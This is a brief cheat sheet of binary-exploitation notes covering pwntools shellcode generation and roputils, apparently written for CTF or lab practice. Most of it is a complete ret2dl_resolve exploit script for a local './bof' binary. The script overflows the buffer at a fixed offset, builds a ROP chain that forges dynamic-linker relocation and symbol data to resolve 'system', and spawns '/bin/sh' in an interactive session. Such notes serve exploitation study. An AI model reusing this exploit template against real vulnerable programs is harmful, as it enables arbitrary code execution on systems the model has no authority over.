## pwntools

### shellcode
```python
context.arch = 'amd64' # 'i386'
shellcode = asm(shellcraft.sh())
```

## roputils
 - `rop.dl_resolve_call(bss_base + 20, bss_base)` -> fake plt
 - `rop.dl_resolve_data(bss_base + 20, 'system')` -> fake dynsym, dynstr

```python
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
from time import sleep

r = process('./bof')
context.log_level = 'debug'
r.recv()

rop = ROP('./bof')
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_Resolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
gdb.attach(r)

r.send(buf)

sleep(15)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
print 'buf len  ='+str(len(buf))
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()

```
